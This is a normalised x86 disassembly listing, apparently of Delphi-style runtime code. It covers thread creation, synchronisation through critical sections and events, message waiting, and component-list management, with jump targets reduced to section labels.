call sub_41f558
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41f584
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41f708
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f50c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41f708
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f50c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41f708
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41f50c
jmp r-xdata
pop edx
pop ebx
retn
sub_41f608
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_405974
je r-xdata
mov eax esi
test eax eax
je r-xdata
mov [ esp + 0x4 ] edi
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41f708
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f50c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41f50c
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
mov dl 0xc
mov eax ebx
call sub_41f708
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f50c
mov dl 0x6
mov eax ebx
call sub_41f708
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f50c
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41f50c
sub_41f6b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f6f9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_407500
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41f608
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f700
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41f7b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
call sub_41f768
mov eax ebx
call sub_41f774
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41f979
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f95a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f961
mov eax [ ebp - 0xc ]
call sub_404650
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_419898
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41978c
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41f8fd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f8be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f904
push rw-data
call EnterCriticalSection
retn
sub_41f8c3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call sub_404eec
call sub_402fc4
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ edx + 0x10 ] eax
jmp r-xdata
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f904
push rw-data
call EnterCriticalSection
retn
sub_41f904
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx 0x18
call sub_402f1c
mov edx 0xc
mov eax [ ebp - 0x8 ]
call sub_402f1c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SetEvent
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_419898
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41978c
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41f8fd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f8be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f961
mov eax [ ebp - 0xc ]
call sub_404650
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f904
push rw-data
call EnterCriticalSection
retn
sub_41f98c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fa23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa2a
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41f790
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_41f9cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_405514
retn
mov eax [ ebp - 0x4 ]
call sub_404650
sub_41f9d2
call sub_402fc4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa2a
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41f790
test bl bl
je r-xdata
mov eax esi
call sub_405514
retn
mov eax [ ebp - 0x4 ]
call sub_404650
sub_41fa34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41fade
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_404620
call sub_41f79c
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_41f98c
xor edx edx
xor eax eax
call sub_4054b4
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_404974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fae5
lea eax [ ebp - 0x10 ]
call sub_405530
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40d2e8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
sub_41fb04
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
mov edx esi
call sub_41fc6c
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
mov eax [ esi + 0x38 ]
call sub_404650
call sub_41f7a8
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_41ff18
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
mov eax esi
call sub_41ff20
mov eax esi
call sub_41fef0
sub_41fb84
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_41fbf2
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbf9
lea eax [ ebp - 0x14 ]
call sub_405530
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40d2e8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
sub_41fc40
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41fc00
pop esi
pop ebx
retn
sub_41fc6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41fd1e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd25
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_419898
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax [ ebx ]
cmp edi [ eax ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_41978c
mov eax [ ebx ]
mov edx 0x18
call sub_402f1c
mov edx 0xc
mov eax ebx
call sub_402f1c
mov eax [ ebx ]
mov eax [ eax + 0xc ]
cmp eax [ ebp + 0xc ]
jne r-xdata
sub_41fd2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax 0xc
call sub_402f00
mov [ ebp - 0xc ] eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
jmp r-xdata
movzx ebx [ ebp - 0x5 ]
xor bl 0x1
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_419740
call sub_41f790
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_41fea2
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41fe7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
cmp [ rw-data ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe82
push rw-data
call LeaveCriticalSection
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41fe5c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41fe82
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call CloseHandle
sub_41fec8
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
xor ecx ecx
mov eax [ eax ]
call sub_41fd2c
pop ebp
retn 0x8
sub_41fef0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_41fc00
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_41ff20
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_41fc00
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_41f7b4
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41fc00
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_41ffc4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_420180
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_420010
push ebx
push esi
push ecx
call sub_404a1c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_420278
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_42021c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebx
call sub_419e14
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_4201e4
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4049c4
lea eax [ ebx + 0x14 ]
call sub_40f944
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_419898
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_420098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4198f4
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_419740
mov edx ebx
mov eax esi
call sub_420098
sub_42012c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_419740
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x10 ] eax
sub_420158
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4199dc
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_404650
xor eax eax
mov [ ebx + 0x10 ] eax
sub_420180
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40484c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_42012c
mov dl 0x1
mov eax ebx
call sub_4206b8
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx ebx
call sub_4201e4
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_420668
sub_4201e4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4206b8
mov edx ebx
mov eax esi
call sub_420158
pop edi
pop esi
pop ebx
retn
sub_42021c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_419980
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_4201e4
jmp r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_420158
sub_420278
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_419898
call sub_420278
inc edi
dec esi
jne r-xdata
sub_4202b4
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4199dc
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_404650
xor eax eax
mov [ ebx + 0x14 ] eax
sub_4202d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4202b4
mov edx ebx
mov eax esi
call sub_4202b4
pop esi
pop ebx
retn
sub_4202f4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_4202d8
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_419898
movzx ecx [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
cmp ebx [ eax + 0x8 ]
jl r-xdata
test ebx ebx
jge r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub_420354
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_4200ec
push ebx
push sub_420114
movzx eax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_420100
push ebx
push sub_420120
movzx eax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_42044c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_409a84
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4204e4
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
sub_4204e4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_419898
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_409a84
test al al
jne r-xdata
sub_420534
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_405974
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
xor edx edx
mov eax esi
call sub_409c58
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
xor edx edx
mov eax ebx
call sub_4206b8
mov edx esi
mov eax ebx
call sub_4205c4
mov dl 0x1
mov eax ebx
call sub_4206b8
sub_4205d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_419898
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_419824
sub_420614
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4198f4
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41978c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_419914
sub_420668
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420604
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4205d8
mov cl 0x1
mov edx ebx
call sub_420668
inc edi
dec ebp
jne r-xdata
sub_4206b8
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4057e8
mov edx esp
mov eax esi
call sub_404924
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_420700
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420728
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420770
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_404704
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4207b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4207d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
